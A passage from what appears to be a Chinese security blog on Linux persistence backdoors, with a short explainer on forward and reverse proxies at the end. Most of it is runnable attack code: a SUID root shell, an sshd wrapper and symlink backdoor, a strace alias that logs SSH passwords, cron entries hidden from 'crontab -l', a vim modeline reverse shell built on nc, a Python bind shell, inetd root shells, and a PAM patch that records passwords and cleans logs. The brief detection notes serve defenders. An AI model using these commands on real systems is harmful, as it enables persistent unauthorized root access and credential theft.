number">17</span>:14 .woot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用一般用户运行：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Copy$/tmp/.woot $/tmp/.woot -p    //bash2 针对 suid 有一些护卫的措施，使用-p参数来获取一个root shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>检测：查找具有suid权限的文件即可</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript">Copyfind <span class="token operator">/</span> <span class="token operator">-</span>perm <span class="token operator">+</span><span class="token number">4000</span> <span class="token operator">-</span>lsfind <span class="token operator">/</span> <span class="token operator">-</span>perm <span class="token operator">-</span>u<span class="token operator">=</span>s <span class="token operator">-</span><span class="token keyword">type</span> <span class="token class-name">f</span> <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="0x03-LKM-Linux-rootkit后门"><a href="#0x03-LKM-Linux-rootkit后门" class="headerlink" title="0x03 LKM Linux rootkit后门"></a>0x03 LKM Linux rootkit后门</h3><p>项目地址:<a href="https://github.com/f0rb1dd3n/Reptile">https://github.com/f0rb1dd3n/Reptile</a></p><p>适用的系统:</p><pre class="line-numbers language-delphi" data-language="delphi"><code class="language-delphi">CopyDebian 9：4.9.0-8-amd64 Debian 10：4.19.0-8-amd64 Ubuntu 18.04.1 LTS：4.15.0-38-generic Kali Linux：4.18.0-kali2-amd64 Centos 6.10：2.6.32- 754.6.3.el6.x86_64 Centos 7：3.10.0-862.3.2.el7.x86_64 Centos 8：4.18.0-147.5.1.el8_1.x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x04-SSH-后门"><a href="#0x04-SSH-后门" class="headerlink" title="0x04 SSH 后门"></a>0x04 SSH 后门</h3><h4 id="4-1-SSH-wrapper"><a href="#4-1-SSH-wrapper" class="headerlink" title="4.1 SSH wrapper"></a>4.1 SSH wrapper</h4><p>判断连接来源端口，将恶意端口来源访问传输内容重定向到&#x2F;bin&#x2F;sh中:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copycd /usr/sbin/<span class="token function">mv</span> sshd <span class="token punctuation">..</span>/bin/<span class="token builtin class-name">echo</span> <span class="token string">'#!/usr/bin/perl'</span> <span class="token operator">></span>sshd<span class="token builtin class-name">echo</span> <span class="token string">'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);'</span> <span class="token operator">>></span>sshd   //4A是13377的小端模式<span class="token builtin class-name">echo</span> <span class="token string">'exec&#123;"/usr/bin/sshd"&#125; "/usr/sbin/sshd",@ARGV,'</span> <span class="token operator">>></span>sshd<span class="token function">chmod</span> u+x sshd/etc/init.d/sshd restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在本机执行:</p><pre class="line-numbers language-css" data-language="css"><code class="language-css">Copysocat STDIO <span class="token property">TCP4</span><span class="token punctuation">:</span><span class="token property">target_ip</span><span class="token punctuation">:</span>22<span class="token punctuation">,</span>sourceport=13377<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200306165200237-492698024.png"></p><p>实现原理：init 首先启动的是 &#x2F;usr&#x2F;sbin&#x2F;sshd ,脚本执行到 getpeername  这里的时候，正则匹配会失败，于是执行下一句，启动 &#x2F;usr&#x2F;bin&#x2F;sshd ，这是原始 sshd 。原始的 sshd 监听端口建立了 tcp  连接后，会 fork 一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的 &#x2F;usr&#x2F;sbin&#x2F;sshd  ，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字， getpeername 能真的获取到客户端的 TCP 源端口，如果是  13377 就执行sh给个shell。</p><p>想要修改连接端口的话可以利用py修改：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">Copyimport <span class="token keyword">struct</span>buffer <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'>I6'</span><span class="token punctuation">,</span><span class="token number">19526</span><span class="token punctuation">)</span><span class="token builtin">print</span> <span class="token function">repr</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305165647857-2116649151.png"></p><p>优点：<br> 1、在无连接后门的情况下，管理员是看不到端口和进程的，last也查不到登陆。<br> 2、在针对边界设备出网，内网linux服务器未出网的情况下，留这个后门可以随时管理内网linux服务器，还不会留下文件和恶意网络连接记录。</p><h4 id="4-2-SSH-软连接后门"><a href="#4-2-SSH-软连接后门" class="headerlink" title="4.2 SSH 软连接后门"></a>4.2 SSH 软连接后门</h4><p>软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息(su)，然而 su 在 pam_rootok 只检测 uid 0 即可认证成功，这样就导致了可以使用任意密码登录:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copyln -sf /usr/sbin/sshd /tmp/su/tmp/su -oPort<span class="token operator">=</span><span class="token number">888</span><span class="token function">ssh</span> root@127.0.0.1 -p <span class="token number">888</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305205754698-1274201580.png"></p><p>优点：能够绕过一些网络设备的安全流量监测，但是本地在查看监听端口时会暴露端口，建议设置成8081，8080等端口。</p><h4 id="4-3-SSH-公钥免密登陆"><a href="#4-3-SSH-公钥免密登陆" class="headerlink" title="4.3 SSH 公钥免密登陆"></a>4.3 SSH 公钥免密登陆</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copyssh-keygen -t rsa //生成公钥<span class="token builtin class-name">echo</span> id_rsa.pub <span class="token operator">>></span> .ssh/authorized_keys  //将id_rsa.pub内容放到目标.ssh/authorized_keys里<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个是老生常谈的公钥免登陆，这种用法不只是用在留后门，还可以在一些特殊情况下获取一个交互的shell，如struts写入公钥，oracle写入公钥连接，Redis未授权访问等情景。</p><h4 id="4-4-SSH-Keylogger记录密码"><a href="#4-4-SSH-Keylogger记录密码" class="headerlink" title="4.4 SSH Keylogger记录密码"></a>4.4 SSH Keylogger记录密码</h4><p>当前系统如果存在strace的话，它可以跟踪任何进程的系统调用和数据，可以利用 strace 系统调试工具获取 ssh 的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码的作用。</p><p>在当前用户的 .bashrc 里新建一条 alias ，这样可以抓取他登陆其他机器的 ssh 密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copyalias <span class="token assign-left variable">ssh</span><span class="token operator">=</span><span class="token string">'strace -o /tmp/.sshpwd-`date '</span>+%d%h%m%s<span class="token string">'`.log -e read,write,connect -s2048 ssh'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置完毕后，倘若当前系统不存在alias，那么就会影响其正常使用：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305210445202-153632745.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copygrep <span class="token string">"read(5"</span> /tmp/.sshpwd-09May32324242.log <span class="token operator">|</span> <span class="token function">tail</span> -n <span class="token number">11</span>    //根据不同环境自行调试响应行数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305211117157-1374708307.png"></p><h4 id="4-5-strace监听ssh来源流量"><a href="#4-5-strace监听ssh来源流量" class="headerlink" title="4.5 strace监听ssh来源流量"></a>4.5 strace监听ssh来源流量</h4><p>不只是可以监听连接他人，还可以用来抓到别人连入的密码。应用场景如：通过漏洞获取root权限，但是不知道明文密码在横向扩展中可以使用。</p><p>之前有用别名的方式来抓取登陆其他机器时的密码、同样也可以利用strace来监听登陆本地的sshd流量。</p><pre class="line-numbers language-perl" data-language="perl"><code class="language-perl">Copyps <span class="token operator">-</span>ef <span class="token operator">|</span> grep sshd    <span class="token operator">//</span>父进程PIDstrace <span class="token operator">-f</span> <span class="token operator">-p</span> <span class="token number">4241</span> <span class="token operator">-o</span> <span class="token regex">/tmp/</span><span class="token operator">.</span>ssh<span class="token operator">.</span>log <span class="token operator">-e</span> trace<span class="token operator">=</span>read<span class="token punctuation">,</span>write<span class="token punctuation">,</span>connect <span class="token operator">-s</span> <span class="token number">2048</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305211719699-1558610383.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305212145796-1257295497.png"></p><p>检测：查看shell的配置文件或者 alias 命令即可发现，例如 ~&#x2F;.bashrc 或 ~&#x2F;.zshrc 文件查看是否有恶意的 alias</p><h3 id="0x05-Cron后门"><a href="#0x05-Cron后门" class="headerlink" title="0x05 Cron后门"></a>0x05 Cron后门</h3><p>在Linux系统中，计划任务一般是由cron承担，我们可以把cron设置为开机时自动启动。cron启动后，它会读取它的所有配置文件（全局性配置文件&#x2F;etc&#x2F;crontab，以及每个用户的计划任务配置文件），然后cron会根据命令和执行时间来按时来调用工作任务。</p><p>cron表达式在线生成：<a href="http://qqe2.com/cron">http://qqe2.com/cron</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copy<span class="token punctuation">(</span>crontab -l<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token string">'*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i'</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">crontab</span> -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305213650119-595237820.png"></p><p>这样执行会在crontab列表里出现，如果是如上执行的话，管理员执行crontab -l就能看到执行的命令内容不是特别隐蔽。</p><p>那么就有了一个相对的高级用法，下面命令执行后会显示”no crontab for root”。其实就达到了一个隐藏的效果，这时候管理员如果执行 crontab -l 就会看到显示”no crontab for root”:</p><pre class="line-numbers language-perl" data-language="perl"><code class="language-perl">Copy<span class="token punctuation">(</span>crontab <span class="token operator">-l</span><span class="token punctuation">;</span>printf <span class="token string">"*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n"</span><span class="token punctuation">)</span><span class="token operator">|</span>crontab <span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305214230870-387789665.png"></p><p>实际上是他将 cron 文件写到文件中,而 crontab -l 就是列出了该文件的内容:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copy/var/spool/cron/crontabs/root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通常 cat 是看不到这个的，只能利用 less、vim 或者 cat -A 看到，这也是利用了cat的一个缺陷，在下一节会主要讲这个。</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305214447271-1226946787.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copy<span class="token comment">#这几个路径都可以存放cron执行脚本,对应的时间不同</span>/etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.hourly/ /etc/cron.monthly/ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="0x06-Cat隐藏"><a href="#0x06-Cat隐藏" class="headerlink" title="0x06 Cat隐藏"></a>0x06 Cat隐藏</h3><p>刚刚在cron里面提到了cat的一个缺陷，可以利用这个缺陷隐藏恶意命令在一些脚本中：这里的示例我就用 hiding-from-cats  里的例子吧。之所以单列出来，个人认为在一些大型企业的运维工具脚本中可以插入恶意代码，利用cat的缺陷还可以使管理员无法发现脚本被做手脚。</p><p>cat其实默认使用是支持一些比如 \r 回车符 \n 换行符 \f 换页符、也就是这些符号导致的能够隐藏命令。</p><p>使用python生成带有换行符的内容sh：</p><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">Copycmd_h <span class="token operator">=</span> <span class="token string">"echo 'You forgot to check `cat -A`!' > oops"</span> <span class="token operator">#</span> hiddencmd_v <span class="token operator">=</span> <span class="token string">"echo 'Hello world!'"</span>                         <span class="token operator">#</span> visiblewith <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"test.sh"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> as f<span class="token punctuation">:</span>output <span class="token operator">=</span> <span class="token string">"#!/bin/sh\n"</span>output <span class="token operator">+</span><span class="token operator">=</span> cmd_h <span class="token operator">+</span> <span class="token string">";"</span> <span class="token operator">+</span> cmd_v <span class="token operator">+</span> <span class="token string">" #\r"</span> <span class="token operator">+</span> cmd_v <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>cmd_h<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>f<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 py 生成了一个 test.sh 脚本，同目录下只有他本文件，cat查看一下：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305220616509-925341340.png"></p><p>执行一下test.sh：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305220738695-372605639.png"></p><p>cat -A 再次查看一下：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305220835294-1217326615.png"></p><p>其实可以看出来这样就做到了恶意命令隐藏的效果。其实之前 Cron 后门中的隐藏方法就是利用了这个。如果使用 cat -A 查看root文件的话就可以看到计划任务的真正内容了。</p><h3 id="0x07-Vim后门"><a href="#0x07-Vim后门" class="headerlink" title="0x07 Vim后门"></a>0x07 Vim后门</h3><h4 id="vim-modeline-CVE-2019-12735"><a href="#vim-modeline-CVE-2019-12735" class="headerlink" title="vim modeline(CVE-2019-12735)"></a>vim modeline(CVE-2019-12735)</h4><p>该漏洞存在于编辑器的 modeline功能，部分 Linux 发行版默认启用了该功能，macOS 是没有默认启用。 当 vim  打开一个包含了 vim modeline 注释行的文件时，会自动读取这一行的参数配置并调整自己的设置到这个配置。vim默认关闭modeline。</p><p>开启命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copyvim ~/.vimrc<span class="token builtin class-name">set</span> modeline<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当前目录下创建文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copyecho <span class="token string">':!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="'</span> <span class="token operator">></span> hello.txt<span class="token function">vim</span> hello.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200306165831251-1080934852.png"></p><p>反弹shell：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copy:<span class="token operator">!</span>rm /tmp/f<span class="token punctuation">;</span><span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span>/bin/sh -i <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token operator">|</span><span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">9999</span> <span class="token operator">></span>/tmp/f<span class="token operator">||</span><span class="token string">" vi:fen:fdm=expr:fde=assert_fails("</span>source<span class="token punctuation">\</span><span class="token operator">!</span><span class="token punctuation">\</span> <span class="token punctuation">\</span>%<span class="token string">"):fdl=0:fdt="</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="vim-python-扩展后门"><a href="#vim-python-扩展后门" class="headerlink" title="vim python 扩展后门"></a>vim python 扩展后门</h4><p>适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copycd /usr/lib/python2.7/site-packages <span class="token operator">&amp;&amp;</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">nohup</span> <span class="token function">vim</span> -E -c <span class="token string">"pyfile dir.py"</span><span class="token operator">></span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span class="token variable">)</span></span> <span class="token operator">&amp;&amp;</span> <span class="token function">sleep</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -f dir.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>恶意脚本 dir.py 的内容可以是任何功能的后门，比如监听本地的11端口：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Copy<span class="token comment">#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</span><span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> subprocess<span class="token keyword">import</span> os<span class="token punctuation">,</span> threading<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> time<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>       server<span class="token operator">=</span>socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">)</span>       server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>       <span class="token keyword">print</span> <span class="token string">'waiting for connect'</span>       talk<span class="token punctuation">,</span> addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token keyword">print</span> <span class="token string">'connect from'</span><span class="token punctuation">,</span>addr       proc <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-i"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span>talk<span class="token punctuation">,</span>               stdout<span class="token operator">=</span>talk<span class="token punctuation">,</span> stderr<span class="token operator">=</span>talk<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>攻击机nc连接过去就可以了:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copynohup <span class="token function">vim</span> -E -c <span class="token string">"pyfile dir.py"</span><span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">11</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="0x08-inetd服务后门"><a href="#0x08-inetd服务后门" class="headerlink" title="0x08 inetd服务后门"></a>0x08 inetd服务后门</h3><p>inetd是一个监听外部网络请求(就是一个socket)的系统守护进程，默认情况下为13端口。当inetd接收到一个外部请求后，它会根据这个请求到自己的配置文件中去找到实际处理它的程序，然后再把接收到的这个socket交给那个程序去处理。所以，如果我们已经在目标系统的inetd配置文件中配置好，那么来自外部的某个socket是要执行一个可交互的shell，就获取了一个后门。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copy<span class="token comment">#修改/etc/inetd.conf</span><span class="token variable">$vim</span> /etc/inetd.conf<span class="token comment">#discard stream tcp nowait root internal </span><span class="token comment">#discard dgram udp wait root internal </span>daytime stream tcp nowait root /bin/bash <span class="token function">bash</span> -i<span class="token comment">#开启inetd</span><span class="token variable">$inetd</span><span class="token comment">#nc连接</span><span class="token function">nc</span> -vv <span class="token number">192.168</span>.2.11 <span class="token number">13</span>Copy<span class="token comment">#可以配合suid后门，修改/etc/services文件：</span>suidshell <span class="token number">6666</span>/tcp<span class="token comment">#然后修改/etc/inetd.conf</span>suidshell stream tcp nowait root /bin/bash <span class="token function">bash</span> -i<span class="token comment">#可以修改成一些常见的端口，以实现隐藏</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>检测：查看配置文件即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copycat /etc/inetd.conf <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x09-协议后门"><a href="#0x09-协议后门" class="headerlink" title="0x09 协议后门"></a>0x09 协议后门</h3><p>在一些访问控制做的比较严格的环境中，由内到外的TCP流量会被阻断掉。但是对于UDP(DNS、ICMP)相关流量通常不会拦截。</p><h4 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h4><p>主要原理就是利用ICMP中可控的data字段进行数据传输，具体原理请参考: <a href="https://zhuanlan.zhihu.com/p/41154036">https://zhuanlan.zhihu.com/p/41154036</a></p><p>开源工具：ICMP后门项目地址：<a href="https://github.com/andreafabrizi/prism">https://github.com/andreafabrizi/prism</a></p><h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><p>在大多数的网络里环境中IPS&#x2F;IDS或者硬件防火墙都不会监控和过滤DNS流量。主要原理就是将后门载荷隐藏在拥有PTR记录和A记录的DNS域中（也可以利用AAAA记录和IPv6地址传输后门），具体请参考：<a href="https://www.anquanke.com/post/id/85431">通过DNS传输后门来绕过杀软</a></p><p>开源工具：DNS后门项目地址：<a href="https://github.com/DamonMohammadbagher/NativePayload_DNS">https://github.com/DamonMohammadbagher/NativePayload_DNS</a></p><p>协议后门检测：对于DNS&#x2F;ICMP这种协议后门，直接查看网络连接即可，因为在使用过程中会产生大量的网络连接</p><p>清除：kill进程、删除文件即可</p><h3 id="0x10-PAM后门"><a href="#0x10-PAM后门" class="headerlink" title="0x10 PAM后门"></a>0x10 PAM后门</h3><p>PAM使用配置 &#x2F;etc&#x2F;pam.d&#x2F; 下的文件来管理认证方式，应用程序调用相应的配置文件，以加载动态库的形式调用 &#x2F;lib&#x2F;security下的模块。</p><p>PAM配置可分为四个参数: 模块类型、控制标记、模块路径、模块参数，例如: session required pam_selinux.so open</p><p>上面提到的 sshd 软链接后门利用的 PAM 机制达到任意密码登录，还有一种方式是键盘记录。原理主要是通过 pam_unix_auth.c 打补丁的方式潜入到正常的 pam 模块中，以此来记录管理员的帐号密码。</p><p>利用步骤：复制patch到源代码目录 &gt;&gt;&gt; 打patch &gt;&gt;&gt; 编译 &gt;&gt;&gt;  将生成的pam_uninx.so文件覆盖到&#x2F;lib&#x2F;secruity&#x2F;pam_unix.so下 &gt;&gt;&gt; 修改文件属性  &gt;&gt;&gt; 建立密码保存文件，并设置好相关的权限 &gt;&gt;&gt; 清理日志 &gt;&gt;&gt; ok</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copy<span class="token comment">#确保ssh开启pam支持</span><span class="token function">vim</span> /etc/ssh/sshd_configUsePAM <span class="token function">yes</span><span class="token comment">#自动化脚本</span>https://github.com/litsand/shell/blob/master/pam.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>检测：</p><pre class="line-numbers language-perl" data-language="perl"><code class="language-perl">Copy1、通过Strace跟踪sshps axu <span class="token operator">|</span> grep sshdstrace <span class="token operator">-o</span> aa <span class="token operator">-</span>ff <span class="token operator">-p</span> PIDgrep open aa<span class="token operator">*</span> <span class="token operator">|</span> grep <span class="token operator">-</span>v <span class="token operator">-e</span> No <span class="token operator">-e</span> null <span class="token operator">-e</span> denied<span class="token operator">|</span> grep WR<span class="token number">2</span>、检查pam_unix<span class="token operator">.</span>so的修改时间stat <span class="token operator">/</span>lib<span class="token operator">/</span>security<span class="token operator">/</span>pam_unix<span class="token operator">.</span>so      <span class="token comment">#32位</span>stat <span class="token operator">/</span>lib64<span class="token operator">/</span>security<span class="token operator">/</span>pam_unix<span class="token operator">.</span>so    <span class="token comment">#64位</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>清除：yum reinstall pam</p><h3 id="0x10-进程注入"><a href="#0x10-进程注入" class="headerlink" title="0x10 进程注入"></a>0x10 进程注入</h3><p>从技术上说，获取其它的进程并修改它一般是通过操作系统提供的调试接口来实现的，在 linux 中具有调试功能的工具有  ptrace、Gdb、radare2、strace 等，这些工具都是使用 ptrace 这个系统调用来提供服务的。ptrace  系统调用允许一个进程去调试另外一个进程。</p><p>GitHub存在大量开源工具，比如: linux-inject，主要原理是使用 ptrace 向进程中注入恶意 so 文件</p><pre class="line-numbers language-delphi" data-language="delphi"><code class="language-delphi">Copy$.&#x2F;inject [-n process-name] [-p pid] [library-to-inject].&#x2F;inject -n sample-target sample-library.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>清除：kill或者重启对应的进程即可</p><p>还有 cymothoa ：<a href="https://github.com/jorik041/cymothoa">https://github.com/jorik041/cymothoa</a></p><h3 id="0x11-Rootkit"><a href="#0x11-Rootkit" class="headerlink" title="0x11 Rootkit"></a>0x11 Rootkit</h3><p>rootkit分为内核级和应用级两种:内核级的比如：Diamorphine，应用级的比如：Mafix</p><p>Mafix 是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。应用级rookit，主要替换ls、ps、netstat命令来隐藏文件</p><p>检测：使用相关检测工具，比如：unhide</p><h2 id="12-内网代理正向与反向"><a href="#12-内网代理正向与反向" class="headerlink" title="12.内网代理正向与反向"></a>12.内网代理正向与反向</h2><h3 id="一-什么是代理"><a href="#一-什么是代理" class="headerlink" title="一 什么是代理"></a>一 什么是代理</h3><p>代理其实就是一个中介，A和B本来可以直连，中间插入一个C，C就是中介。<br>刚开始的时候，代理多数是帮助内网client访问外网server用的<br>后来出现了反向代理，”反向”这个词在这儿的意思其实是指方向相反，即代理将来自外网客户端的请求转发到内网服务器，从外到内</p><h3 id="二-正向代理"><a href="#二-正向代理" class="headerlink" title="二 正向代理"></a>二 正向代理</h3><p>正向代理类似一个跳板机，代理访问外部资源</p><p>比如我们国内访问谷歌，直接访问访问不到，我们可以通过一个正向代理服务器，请求发到代理服，代理服务器能够访问谷歌，这样由代理去谷歌取到返回数据，再返回给我们，这样我们就能访问谷歌了</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402195952165.png"></p><p><strong>正向代理的用途：</strong></p><p>　　（1）访问原来无法访问的资源，如google</p><p>​    （2） 可以做缓存，加速访问资源</p><p>　　（3）对客户端访问授权，上网进行认证</p><p>　　（4）代理可以记录用户访问记录（上网行为管理），对外隐藏用户信息</p><h3 id="三-反向代理"><a href="#三-反向代理" class="headerlink" title="三 反向代理"></a>三 反向代理</h3><p>反向代理（Reverse Proxy）实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器</p><p> <img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402200117241.png"></p><h4 id="反向代理的作用："><a href="#反向代理的作用：" class="headerlink" title="反向代理的作用："></a>反向代理的作用：</h4><p>（1）保证内网的安全，阻止web攻击，大型网站，通常将反向代理作为公网访问地址，Web服务器是内网</p><p>（2）负载均衡，通过反向代理服务器来优化网站的负载</p><h3 id="四-总结"><a href="#四-总结" class="headerlink" title="四 总结"></a>四 总结</h3><p><strong>正向代理即是客户端代理, 代理客户端, 服务端不知道实际发起请求的客户端.</strong></p><p><strong>反向代理即是服务端代理, 代理服务端, 客户端不知道实际提供服务的服务端</strong></p><h4 id="看图理解一："><a href="#看图理解一：" class="headerlink" title="看图理解一："></a>看图理解一：</h4><p><strong><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1350514-20190313105354768-2077480083.png"></strong></p><h4 id="看图理解二："><a href="#看图理解二：" class="headerlink" title="看图理解二："></a>看图理解二：</h4><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1350514-20190313105516378-237949533.png"></p><p>正向代理中，proxy和client同属一个LAN，对server透明；<br>反向代理中，proxy和server同属一个LAN，对client透明。<br>实际上proxy在两种代理中做的事都是代为收发请求和响应，不过从结构上来看正好左右互换了下，所以把后出现的那种代理方式叫成了反向代理</p><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>正向代理: 买票的黄牛</p><p>反向代理: 租房的代理</p><h2 id="13-SQL注入JSON接口与白名单"><a href="#13-SQL注入JSON接口与白名单" 